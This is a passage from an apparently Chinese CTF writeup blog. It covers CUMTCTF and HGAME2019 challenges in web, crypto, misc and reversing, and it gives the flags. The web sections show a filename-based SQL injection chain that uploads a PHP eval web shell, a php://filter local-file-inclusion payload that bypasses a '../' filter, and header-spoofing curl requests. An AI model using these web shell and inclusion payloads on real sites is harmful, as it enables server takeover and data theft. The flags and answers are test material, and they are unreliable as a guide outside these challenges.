<li><p>选择一个文件上传，命名为 <code>&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg.jpg</code>，此时执行的sql语句是<code>insert into <code>file</code> ( <code>filename</code>, <code>view</code>, <code>extension</code>) values( ‘{$path_parts[‘filename’]}’, 0, ‘{$path_parts[‘extension’]}’)</code>，此时的数据库中<code>filename--&gt;&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg</code>，<code>extension--&gt;jpg</code></p>
</li>
<li><p>利用update更新是的后缀名为空，<em>old name:</em>  <code>&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg</code>;<em>new name:</em> <code>snow.jpg</code>，此时执行的sql命令变成<br><code>update <code>file</code> set <code>filename</code>=’snow.jpg’,<code>oldname</code>=’’,extension=’’,filename=’snow.jpg.jpg’ where <code>fid</code>={$result[‘fid’]};</code> ，这样的话数据库中就有文件名为 <code>snow.jpg</code>，后缀名为空的记录，但是实际的文件名却是<code>snow.jpg.jpg</code></p>
</li>
<li><p>上传真正包含shell的文件<code>&lt;?php @eval($_POST[&#39;snow&#39;]);?&gt;</code> ，命名为<code>snow.jpg</code>，数据库中的记录是文件名为snow，扩展名为jpg，</p>
</li>
<li><p>使用rename重命名 <em>old name:</em> <code>snow.jpg</code>，<em>new name:</em> <code>snow.php</code>，此时修改的是文件名是snow.jpg，后缀名为空，此时修改文件名为<code>snow.php</code>，后缀名为空，拼接后就是成功地更名为snow.php，然后访问snow.php即可getshell。</p>
</li>
</ol>
<p><img src="https://i.loli.net/2019/01/27/5c4d642c02f24.png" alt=""></p>
<p><img src="https://i.loli.net/2019/01/27/5c4d642bedc54.png" alt=""></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">flag</span><span class="template-variable">&#123;f34f8aa6cd362582dd1ae5f975c7b20f&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="现代密码签到"><a href="#现代密码签到" class="headerlink" title="现代密码签到"></a>现代密码签到</h2><p>利用在线des解密，密钥为空。<br>解密后发现<br><code>U2FsdGVkX18968C+7acWUzWtYyuQd2MFLMh0HnGGnMlmYlemknPnfg==</code><br>是base64编码，将所得结果再次解密得到flag<br><img src="https://i.imgur.com/jPfKQ85.png" alt=""></p>
<h2 id="古典密码签到"><a href="#古典密码签到" class="headerlink" title="古典密码签到"></a>古典密码签到</h2><p>看到字符串带<code>=</code>，猜测是base系列编码，解密发现是base32编码 ^pho^oav`\ntZnj`\ntZZZcccx ，之后就是移位密码了，当偏移量是5的时候解密出有意义的明文</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">"^pho^oav`\\ntZnj`\\ntZZZcccx"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">	flag += chr(ord(i)+<span class="number">5</span>)</span><br><span class="line">print(flag)</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<p>cumtctf{easy_soeasy___hhh}<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">## easyrsa</span></span><br><span class="line"></span><br><span class="line">本题e很小，联想到应该是低指数攻击，本来以为是<span class="number">16</span>进制，但是一直不对，细看了一下发现只有<span class="number">0</span>-<span class="number">9</span>和A，b共<span class="number">12</span>个字符，猜测应该是<span class="number">12</span>进制，尝试了一下果然就是<span class="number">12</span>进制</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"><span class="meta"># coding=utf-8</span></span><br><span class="line">import gmpy2</span><br><span class="line">e = <span class="number">5</span></span><br><span class="line"><span class="meta"># 读入 n, 密文</span></span><br><span class="line">n = int('<span class="number">3600</span>4b9A985A<span class="number">624479</span>A<span class="number">4891</span>b<span class="number">16130722</span>A5A<span class="number">745398</span>9bA<span class="number">6173</span>7A<span class="number">22636850</span>4A<span class="number">56893812364517</span>96A<span class="number">445824</span>b5A516b176b<span class="number">40135935</span>b0b<span class="number">899904615435</span>9b<span class="number">056053710028</span>9b<span class="number">9795129505</span>b<span class="number">461542</span>A<span class="number">4897</span>A<span class="number">56561529</span>A<span class="number">705135</span>AA<span class="number">772507</span>bb<span class="number">3172</span>b03b<span class="number">3425</span>A<span class="number">9922</span>4b68b45b<span class="number">801459</span>b29A070bAb<span class="number">940876</span>1b4A70b<span class="number">90530877247293</span><span class="number">448692</span>4bA<span class="number">1701</span>3A2A<span class="number">801041</span>A<span class="number">0517</span>8b<span class="number">0488</span>AA5',<span class="number">12</span>)</span><br><span class="line">c = int('411A016A<span class="number">67176879</span>3b5AAbA4A<span class="number">043001</span>A468b8A9A<span class="number">61222904612663</span><span class="number">9318</span>1b<span class="number">021812</span>b6AAbAA1b<span class="number">5716</span>1bAA<span class="number">30032117415486</span><span class="number">2338</span>b<span class="number">0098249626</span>A<span class="number">9311</span>6b<span class="number">34752540987309</span>A<span class="number">0852</span>0bb<span class="number">678080</span>4b<span class="number">5679144173</span>Ab<span class="number">7301</span>b<span class="number">4932258750</span>4A75A7A<span class="number">244592</span>8A07A650bb<span class="number">6076</span>bA<span class="number">3412</span>b<span class="number">1375205336</span>b43A11A<span class="number">1510</span>A<span class="number">2289</span>3b<span class="number">937065</span>',<span class="number">12</span>)</span><br><span class="line">m, b = gmpy2.iroot(c, e)</span><br><span class="line">print hex(m)[<span class="number">2</span>:].decode('hex')</span><br></pre></td></tr></table></figure></p>
<p>flag如下：<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">cumtctf</span><span class="template-variable">&#123;12_jinzhi_rsa&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure></p>
<h2 id="playfir"><a href="#playfir" class="headerlink" title="playfir"></a>playfir</h2><p>题目提示很明显，playfire密码爆破，可以看到秘钥是四位，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># playfair</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回该字符的行号和列号</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_row_col</span><span class="params">(word,pass_table)</span>:</span></span><br><span class="line">	li = pass_table.index(word)</span><br><span class="line">	li_r = li // <span class="number">5</span></span><br><span class="line">	li_c = li % <span class="number">5</span></span><br><span class="line">	<span class="keyword">return</span> (li_r,li_c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入两个元素的坐标，得到解密对应的两个元素</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dou_word</span><span class="params">(r1,c1,r2,c2)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> r1 == r2:</span><br><span class="line">		c1 = (c1<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line">		c2 = (c2<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line">		<span class="keyword">return</span> [(r1,c1),(r2,c2)]</span><br><span class="line">	<span class="keyword">elif</span> c1 == c2:</span><br><span class="line">		r1 = (r1<span class="number">-1</span>) % <span class="number">5</span> </span><br><span class="line">		r2 = (r2<span class="number">-1</span>) % <span class="number">5</span></span><br><span class="line">		<span class="keyword">return</span> [(r1,c1),(r2,c2)]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> [(r1,c2),(r2,c1)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cip,keyword)</span>:</span></span><br><span class="line">	<span class="comment"># global pass_table</span></span><br><span class="line">	alpha = list(string.ascii_uppercase)</span><br><span class="line">	alpha.remove(<span class="string">'J'</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> keyword:</span><br><span class="line">		<span class="keyword">if</span> i == <span class="string">"J"</span>:</span><br><span class="line">			<span class="keyword">continue</span> </span><br><span class="line">		alpha.remove(i)</span><br><span class="line">	pass_table = list(keyword) + alpha</span><br><span class="line">	plain = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(cip)//<span class="number">2</span>):</span><br><span class="line">		grp = cip[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</span><br><span class="line">		r1,c1 = get_row_col(grp[<span class="number">0</span>],pass_table)</span><br><span class="line">		r2,c2 = get_row_col(grp[<span class="number">1</span>],pass_table)</span><br><span class="line">		temp = get_dou_word(r1,c1,r2,c2)</span><br><span class="line">		p1 = temp[<span class="number">0</span>][<span class="number">0</span>]*<span class="number">5</span> + temp[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">		p2 = temp[<span class="number">1</span>][<span class="number">0</span>]*<span class="number">5</span> + temp[<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">		plain += pass_table[p1] + pass_table[p2]</span><br><span class="line">	<span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sss <span class="keyword">in</span> itertools.permutations(string.ascii_uppercase,<span class="number">4</span>):</span><br><span class="line">	now_key = <span class="string">""</span>.join(sss)</span><br><span class="line">	cip1 = <span class="string">"DMBCCVTLMNKQ"</span></span><br><span class="line">	cip2 = <span class="string">"LRBECXPTCPHU"</span></span><br><span class="line">	t1 = decrypt(cip1,now_key)</span><br><span class="line">	t2 = decrypt(cip2,now_key)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"FLAGA"</span> <span class="keyword">in</span> t1:</span><br><span class="line">		print(t1)</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">elif</span> <span class="string">"FLAGB"</span> <span class="keyword">in</span> t2:</span><br><span class="line">		print(t2)</span><br><span class="line">		<span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>可以得到爆破出来符合条件的明文，找出语义正确的即可</p>
<blockquote>
<p>flagaplayfirflagbyoudoit</p>
</blockquote>
<p>求出md5值即可</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">355</span><span class="keyword">c</span><span class="number">1</span>fb<span class="number">44</span>b<span class="number">58</span>ad<span class="number">7</span><span class="keyword">c</span><span class="number">38</span>d<span class="number">88</span>b<span class="number">5</span>ba<span class="number">4</span>f<span class="number">095</span>b<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="misc签到"><a href="#misc签到" class="headerlink" title="misc签到"></a>misc签到</h2><p>解压之后给出了5个图片文件:</p>
<p><img src="https://i.loli.net/2019/01/29/5c4fc4c6822ca.png" alt=""></p>
<p>文件夹名是braille，想到了盲文，搜索盲文对照表</p>
<p><img src="https://i.loli.net/2019/01/29/5c4fc69264c59.png" alt=""></p>
<p>根据解压文件夹的提示可以对照出flag是B1ind。</p>
<h2 id="base全家桶了解一下"><a href="#base全家桶了解一下" class="headerlink" title="base全家桶了解一下??"></a>base全家桶了解一下??</h2><p>应该就是base编码的转换，尝试一下不同的base编码即可</p>
<p>第一层base64</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GY<span class="number">3</span>DMQZWGE<span class="number">3</span><span class="keyword">DO</span><span class="symbol">N2</span>CGU<span class="number">3</span>TM<span class="symbol">NJWIM3</span>DGMZQGZCDM<span class="symbol">NJVIY3</span>TIMZQGMYDKRRWG<span class="name">M3</span>TK<span class="symbol">NSEG42</span>DMMZXGQ<span class="number">3</span>DM<span class="symbol">N2</span>E</span><br></pre></td></tr></table></figure>
<p>第二层base32</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">666</span>C61677B57656C63306D655F7430305F63756D746374667D</span><br></pre></td></tr></table></figure>
<p>第三层base16</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">flag</span><span class="template-variable">&#123;Welc0me_t00_cumtctf&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure>
<h2 id="BXS图标真好看"><a href="#BXS图标真好看" class="headerlink" title="BXS图标真好看"></a>BXS图标真好看</h2><p>记事本打开发现是一个二进制文件，file命令查看一下文件类型</p>
<blockquote>
<p>BXS.txt: PNG image data, 495 x 422, 8-bit/color RGBA, non-interlaced</p>
</blockquote>
<p>修改后缀为png，看到一串文字<code>fgoo kwnl{_u n_gaDy_ 0p}</code>，提示古典加密，猜测是栅栏密码，因为字符串长度是21，所以应该分三栏</p>
<p><img src="https://i.loli.net/2019/01/25/5c4a720c0a5e5.png" alt=""></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">flag</span><span class="template-variable">&#123;Do_you_kn0w_png&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure>
<h2 id="矿大校歌认真听听吧？"><a href="#矿大校歌认真听听吧？" class="headerlink" title="矿大校歌认真听听吧？"></a>矿大校歌认真听听吧？</h2><p>下载zip压缩包，解压后需要密码，在16进制编辑器文件尾部看到<code>cumtctf2019</code>，解压即可得到一个mp3文件，音频也没有什么异常，应该是mp3隐写了<a href="https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2</a>，运行尝试一下</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Decode</span><span class="selector-class">.exe</span> <span class="selector-tag">-X</span> <span class="selector-tag">-P</span> <span class="selector-tag">cumtctf2019</span> <span class="selector-tag">cumt</span><span class="selector-class">.mp3</span></span><br></pre></td></tr></table></figure>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">flag</span><span class="template-variable">&#123;cumtctf_1s_v3ry_g00d!&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure>
<h2 id="起床改error啦！"><a href="#起床改error啦！" class="headerlink" title="起床改error啦！"></a>起床改error啦！</h2><p>binwalk查看图片发现存在zip压缩包，提取一下</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">binwalk</span> 2333<span class="selector-class">.png</span></span><br><span class="line"><span class="selector-tag">foremost</span> 2333<span class="selector-class">.png</span></span><br></pre></td></tr></table></figure>
<p>解压压缩包可以得到一个doc文件，在选项中查看隐藏文字即可看到flag</p>
<p><img src="https://i.loli.net/2019/01/27/5c4d21fd3ea8c.png" alt=""></p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="逆向签到"><a href="#逆向签到" class="headerlink" title="逆向签到"></a>逆向签到</h2><p>直接丢进IDA查看，查看伪代码：</p>
<p><img src="https://i.loli.net/2019/01/28/5c4f1b9f3be88.png" alt=""></p>
<p>可以看到这些变量占用了4个字节来存储。</p>
<p><img src="https://i.loli.net/2019/01/28/5c4f1ade58965.png" alt=""></p>
<p>这里的v35是100以内的任何数，也就是说可以通过爆破的方式来求得v35的值。</p>
<p><img src="https://i.loli.net/2019/01/28/5c4f1c7412770.png" alt=""></p>
<p>查看check函数，s里面的数字应该和从v5开始，地址每加上4LL的值相等。也就是说在29位的flag里面，每一位的值和v5-v34相等。所以写一个简单的脚本即可爆破出来。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">v5 = [<span class="number">53</span>,<span class="number">63</span>,<span class="number">50</span>,<span class="number">52</span>,<span class="number">40</span>,<span class="number">1</span>,<span class="number">50</span>,<span class="number">61</span>,<span class="number">55</span>,<span class="number">99</span>,<span class="number">62</span>,<span class="number">118</span>,<span class="number">98</span>,<span class="number">60</span>,<span class="number">60</span>,<span class="number">12</span>,<span class="number">106</span>,<span class="number">58</span>,<span class="number">37</span>,<span class="number">54</span>,<span class="number">12</span>,<span class="number">38</span>,<span class="number">12</span>,<span class="number">102</span>,<span class="number">48</span>,<span class="number">60</span>,<span class="number">33</span>,<span class="number">54</span>,<span class="number">46</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">29</span>):</span><br><span class="line">        res += chr(v5[j]^i)</span><br><span class="line">    <span class="keyword">print</span> res</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<p><img src="https://i.loli.net/2019/01/28/5c4f1a3be6535.png" alt=""></p>
<h2 id="Eazy-Math"><a href="#Eazy-Math" class="headerlink" title="Eazy_Math"></a>Eazy_Math</h2><p>同样的，还是丢进IDA中查看伪代码：</p>
<p><img src="https://i.loli.net/2019/01/28/5c4f1a6c49e42.png" alt=""></p>
<p>flag有9位，在经过String2Int和Change两个函数的变换后，如果check成功，即可成功。</p>
<p>首先查看String2Int函数：</p>
<p><img src="https://i.loli.net/2019/01/28/5c4f1be73b91e.png" alt="img"></p>
<p>这个函数的作用就是将s里面的字符内容转换成int型的数值存储在v14-v18中。</p>
<p>查看Check函数后，可以轻易看出check的内容就是将变换后的9位与v2-v10相比较。</p>
<p>最后是Change函数：</p>
<p><img src="https://i.loli.net/2019/01/28/5c4f1ab4dec43.png" alt=""></p>
<p>第一个双层循环将a3里面的数值置为0，也就是v4里面的值。第二个三重循环可以拆开来看。前两个变量i和j总共循环9次，代表着算出v4里面的数值。最后一个循环变量m则是计算的过程。这里不妨设9个未知数A,B,C,D,E,F,G,H,I。经过推算，3*k+m 是每次取三个连续的数，3*m+1是每次取0，3，6或1，4，7或2，5，8。这里代表着取v5-v13里面的数值。分析之后可以列出三个方程组：</p>
<script type="math/tex; mode=display">\begin{cases}
A+2B+C=274\\
2A+B+C=294\\
A+B+2C=316
\end{cases}</script><script type="math/tex; mode=display">
\begin{cases}
D+2E+F=262 \\
2D+E+F=274 \\
D+E+2F=252 \\
\end{cases}</script><script type="math/tex; mode=display">
\begin{cases}
G+2H+I=380 \\
2G+H+I=421 \\
G+H+2I=427 \\
\end{cases}</script><p>简单的方程组求得A-G的9个值转化为字符即为flag。</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HGAME2019-Web-Week1&2]]></title>
      <url>/2019/01/30/hgame2019/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做</p>
<a id="more"></a>
<h1 id="week-1"><a href="#week-1" class="headerlink" title="week-1"></a>week-1</h1><h2 id="谁吃了我的flag"><a href="#谁吃了我的flag" class="headerlink" title="谁吃了我的flag"></a>谁吃了我的flag</h2><p>vim文件泄露<code>.index.html.swp</code>，vim恢复即可得到flag<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">hgame</span><span class="template-variable">&#123;3eek_diScl0Sure_fRom+wEbsit@&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure></p>
<h2 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h2><p>url二次编码绕过 <code>?id=%2576%2569%2564%2561%2572</code><br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">hgame</span><span class="template-variable">&#123;urlDecode_Is_GoOd&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure></p>
<h2 id="换头大作战"><a href="#换头大作战" class="headerlink" title="换头大作战"></a>换头大作战</h2><p>题目要求POST传值</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="string">//120.78.184.111</span><span class="function">:8080</span>/week1/how/index.php <span class="params">--data</span> <span class="string">"want=12"</span></span><br></pre></td></tr></table></figure>
<p>得到回显</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">br</span>/&gt;http<span class="variable">s:</span>//www.wikiwand.<span class="keyword">com</span>/<span class="keyword">en</span>/<span class="keyword">X</span>-Forwarded-For&lt;<span class="keyword">br</span>/&gt;<span class="keyword">only</span> localhost can <span class="built_in">get</span> flag</span><br></pre></td></tr></table></figure>
<p>依次按照要求设置请求头</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:<span class="string">//120.78.184.111</span><span class="function">:8080</span>/week1/how/index.php <span class="params">--data</span> <span class="string">"want=12"</span> -H <span class="string">"x-forwarded-for:127.0.0.1"</span> -A <span class="string">"User-Agent:Waterfox/50.0"</span> -e www.bilibili.com</span><br></pre></td></tr></table></figure>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">hgame</span><span class="template-variable">&#123;hTTp_HeaDeR_iS_Ez&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure>
<h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h2><p>查看源代码可知存在f12.php界面，在响应头中可以看到密码 <code>woyaoflag</code>，提交即会出现<code>cilck me to get flag</code>，点击则跳转到 <code>toofast.php</code>，回显<code>aoh,your speed is sososo fast,the flag must have been left in somewhere</code>，应该是出现了302跳转，抓包即可得到flag</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">hgame</span><span class="template-variable">&#123;f12_1s_aMazIng111&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure>
<h1 id="week-2"><a href="#week-2" class="headerlink" title="week-2"></a>week-2</h1><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p>探测目录发现robots.txt下存在文件<code>img/index.php</code>，访问之，得到PHP代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $img = $_GET[<span class="string">'img'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($img))</span><br><span class="line">        $img = <span class="string">'1'</span>;</span><br><span class="line">    $img = str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $img);</span><br><span class="line">    <span class="keyword">include_once</span>($img.<span class="string">".php"</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>题目过滤了<code>../</code>，且将其转换为空字符串，所以我们可以用<code>..././</code>来绕过，本来试了 <code>..././flag</code>，可是打不出flag，最终尝试了filter协议，原因在于include语句会将代码当做php代码执行，而转成base64编码之后则由于没有php前缀而无法被当成php代码从而将文本打印出来</p>
<p>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">118.24</span>.<span class="number">25.25</span>:<span class="number">9999</span><span class="regexp">/easyphp/img</span><span class="regexp">/index.php?img=php:/</span><span class="regexp">/filter/</span>read=convert.base64-encode<span class="regexp">/resource=.../</span>.<span class="regexp">/flag</span></span><br></pre></td></tr></table></figure>
<p>base64解码即可得到flag，</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">hgame</span><span class="template-variable">&#123;You_4re_So_g0od&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure>
<h2 id="php-trick"><a href="#php-trick" class="headerlink" title="php trick"></a>php trick</h2><p>代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//admin.php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = (string)@$_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = (string)@$_GET[<span class="string">'str2'</span>];</span><br><span class="line">$str3 = @$_GET[<span class="string">'str3'</span>];</span><br><span class="line">$str4 = @$_GET[<span class="string">'str4'</span>];</span><br><span class="line">$str5 = @$_GET[<span class="string">'H_game'</span>];</span><br><span class="line">$url = @$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 4 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"H_game"</span>) !==<span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 5 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($str5))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 6 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($str5&lt;<span class="number">9999999999</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 7 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span 